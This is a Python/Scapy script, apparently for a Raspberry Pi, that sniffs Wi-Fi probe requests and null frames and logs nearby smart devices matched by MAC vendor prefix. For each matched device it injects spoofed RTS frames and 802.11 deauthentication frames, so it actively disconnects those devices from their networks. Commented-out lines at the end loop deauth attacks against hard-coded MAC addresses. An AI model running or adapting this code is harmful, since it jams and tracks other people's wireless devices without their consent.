#!/usr/bin/env python

#import scapy_ex
import sys
import fcntl, socket, struct
from datetime import datetime
from scapy.all import *
import socket
#import RPi.GPIO as GPIO
import time
from threading import Thread

#GPIO.setwarnings(False)
#GPIO.setmode(GPIO.BCM)
#GPIO.setup(14,GPIO.IN)     #Define pin 3 as an output pin


MANAGEMENT_FRAME_TYPE = 0
DATA_FRAME_TYPE = 2
PROBE_REQUEST_SUBTYPE = 4
NULL_DATA_SUBTYPE = 4
stamgmtstypes = (0, 2, 4)

ap_list = []
ip_address = sys.argv[1]
port = sys.argv[2]
wireless_interface = sys.argv[3]
oui_database = {}
print ip_address, port, wireless_interface
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ip_address, int(port)))
motionStatus = 1


#class Dot11RTS(Dot11): 
#	name = "802.11 RTS" 
#	fields_desc = []
#	def __init__(self, *args, **kwargs): 
#		Dot11.__init__(self, *args, **kwargs) 
#		self.type = "Control" 
#		self.subtype = DOT11_FC_SUBTYPE_RTS 
  
#	def _init_fields_desc(): 
#		Dot11RTS.fields_desc = Dot11.fields_desc[0:7] 
  
#Dot11RTS._init_fields_desc()  

#class Dot11CTS(Dot11): 
#	name = "802.11 CTS" 
#	fields_desc = [] 
#	def __init__(self, *args, **kwargs): 
#		Dot11.__init__(self, *args, **kwargs) 
#		self.type = "Control" 
#		self.subtype = DOT11_FC_SUBTYPE_CTS 
#  
#	def _init_fields_desc(): 
#		Dot11CTS.fields_desc = Dot11.fields_desc[0:6] 
#	   
#	Dot11CTS._init_fields_desc() 

def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    return ':'.join(['%02x' % ord(char) for char in info[18:24]])



def handle_probe(pkt):
	if pkt.haslayer(Dot11ProbeReq) and len(pkt[Dot11ProbeReq].info)>0:
		essid = pkt[Dot11ProbeReq].info
	else:
		essid = 'Hidden SSID'
	client = pkt[Dot11].addr2
	rssi = -(256-ord(pkt.notdecoded[-4:-3]))
	if client[:8].upper() in oui_database:
#		client_socket.send('1 '+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+' '+client+' '+str(rssi)+"\n")
#		print('1 '+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+' '+client+' '+str(rssi))
		print('1 ProbeRequest %s %s %s %s %s %s' % (datetime.now().strftime('%Y-%m-%d %H:%M:%S'),client, rssi, oui_database[client[:8].upper()], essid,pkt.addr3))
#		if pkt.addr3 != 'ff:ff:ff:ff:ff:ff':
		sendp(RadioTap()/Dot11(type=1,subtype=11,addr1=pkt.addr2,addr2="a4:6c:2a:11:02:80",addr3="a4:6c:2a:11:02:80")/Dot11RTS())

def handle_null(pkt):
	if pkt.haslayer(Dot11):
		essid = 'Null/No SSID'
	client = pkt[Dot11].addr2
	rssi = -(256-ord(pkt.notdecoded[-4:-3]))
	if client[:8].upper() in oui_database:
#		client_socket.send('1 '+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+' '+client+' '+str(rssi)+"\n")
#		print('1 '+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+' '+client+' '+str(rssi))
		sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=pkt.addr2,addr2=pkt.addr3,addr3=pkt.addr3)/Dot11Deauth())
		print('1 NullFrame %s %s %s %s %s %s' % (datetime.now().strftime('%Y-%m-%d %H:%M:%S'),client, rssi, oui_database[client[:8].upper()], essid, pkt.addr3))

def PacketHandler(pkt) :
	if pkt.haslayer(Dot11) :
		if pkt.type == MANAGEMENT_FRAME_TYPE and pkt.subtype in stamgmtstypes:
			handle_probe(pkt)
		if pkt.type == DATA_FRAME_TYPE and pkt.subtype == NULL_DATA_SUBTYPE:
			handle_null(pkt)
#			print(pkt.show())


class pirReadingThread(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()
    def run(self):
		while True:
			i=GPIO.input(14)
			if i==1:                 #When output from motion sensor is LOW
				motionStatus = 1
				time.sleep(0.5)
			


print getHwAddr(wireless_interface)
#oui_database = [line.rstrip('\n').split()[0] for line in open("smart_device.txt")]
with open("smart_device.txt") as f:
    for line in f:
       (key, val) = line.rstrip('\n').split()
       oui_database[key] = val
sniff(iface=wireless_interface, prn = PacketHandler)

#while True:
#       i=GPIO.input(14)
#       if i==0:                 #When output from motion sensor is LOW
#             print "No intruders",i
#             time.sleep(0.1)
#       elif i==1:               #When output from motion sensor is HIGH
#             print "Intruder detected",i
#             time.sleep(0.1)

#sendp(RadioTap()/Dot11(addr1="68:3e:34:c9:df:e1", addr2="a4:6c:2a:11:02:80", addr3="a4:6c:2a:11:02:80")/Dot11Deauth(reason=12), iface="wlp3s0", loop=1)
#sendp(RadioTap()/Dot11(addr1="a4:6c:2a:11:02:80", addr2="68:3e:34:c9:df:e1", addr3="68:3e:34:c9:df:e1")/Dot11Deauth(reason=12), iface="wlp3s0", count =5)
